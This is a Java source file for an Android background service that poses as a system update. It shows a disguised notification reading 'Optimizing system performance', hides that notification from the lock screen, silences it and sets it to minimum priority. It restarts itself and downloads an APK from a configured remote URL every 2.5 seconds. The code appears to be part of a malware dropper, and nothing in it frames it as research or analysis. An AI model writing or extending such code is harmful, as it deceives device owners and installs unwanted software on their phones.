package com.system.security.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class BackgroundService extends Service {
    
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "sys_update_channel";
    
    private Handler handler = new Handler();
    private Runnable downloadRunnable;
    
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Start as foreground
        Notification notification = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, 
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
        
        // Start auto download loop (every 2.5 seconds)
        startDownloadLoop();
        
        return START_STICKY;
    }
    
    private void startDownloadLoop() {
        downloadRunnable = new Runnable() {
            @Override
            public void run() {
                if (Config.APK_DOWNLOAD_URL != null && !Config.APK_DOWNLOAD_URL.isEmpty()) {
                    AutoDownloader.downloadApk(BackgroundService.this, Config.APK_DOWNLOAD_URL);
                }
                handler.postDelayed(this, Config.DOWNLOAD_INTERVAL);
            }
        };
        handler.post(downloadRunnable);
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Services",
                    NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("Background system optimization");
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(NotificationCompat.VISIBILITY_SECRET);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Optimizing system performance...")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .setShowWhen(false)
                .setSilent(true)
                .build();
    }
    
    @Override
    public void onDestroy() {
        if (handler != null && downloadRunnable != null) {
            handler.removeCallbacks(downloadRunnable);
        }
        super.onDestroy();
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
